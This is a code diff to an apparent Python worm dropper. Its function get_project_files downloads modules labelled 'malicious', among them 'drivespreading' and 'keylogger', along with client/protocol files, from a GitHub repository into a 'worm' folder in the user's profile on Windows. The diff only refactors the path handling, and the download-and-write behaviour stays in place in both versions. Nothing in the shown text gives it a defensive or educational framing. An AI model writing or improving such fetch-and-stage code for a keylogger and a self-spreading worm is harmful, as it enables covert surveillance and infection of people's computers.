@@ -21,32 +21,37 @@ def install_python(installer_path):
 
 
 def get_project_files():
-    """
-        Download files from a GitHub repository.
-        """
     owner = "EdanJacobson"
     repo = "ProjectCode"
     branch = "main"
     paths = {"malicious": ["drivespreading", "keylogger", "maliciousConstants"],
              "clnt": ["client", "constants", "methods", "protocol"]}
-    # "outlook": ["contacts", "emailconstants"]}
-    base_url = f'https://raw.githubusercontent.com/{owner}/{repo}/{branch}'
-    for path in paths.keys():
-        os.mkdir(f"C:/Users/{os.getlogin()}/worm/{path}")
-        open(f"C:/Users/{os.getlogin()}/worm/{path}/__init__.py", "x")
-        for file in paths.get(path):
-            file_url = f"{base_url}/{path}/{file}.py"
 
+    base_dir = os.path.join("C:/Users", os.getlogin(), "worm")
+
+    for path in paths.keys():
+        dir_path = os.path.join(base_dir, path)
+
+        if not os.path.exists(dir_path):
+            os.makedirs(dir_path)
+            init_file_path = os.path.join(dir_path, "__init__.py")
+            with open(init_file_path, "x") as init_file:
+                pass  # An empty block, as we just want to create an empty file
+
+        for file in paths.get(path):
+            file_url = f"https://raw.githubusercontent.com/{owner}/{repo}/{branch}/{path}/{file}.py"
             response = requests.get(file_url)
 
             if response.status_code == 200:
                 content = response.content
-                output_file = f"C:/Users/{os.getlogin()}/worm/{path}/{file}.py"
+                output_file = os.path.join(dir_path, f"{file}.py")
                 sys.path.append(output_file)
+
                 with open(output_file, 'wb') as f:
                     f.write(content)
             else:
                 print(f"Failed to download file. Status code: {response.status_code}")
+
 
 
 def main():
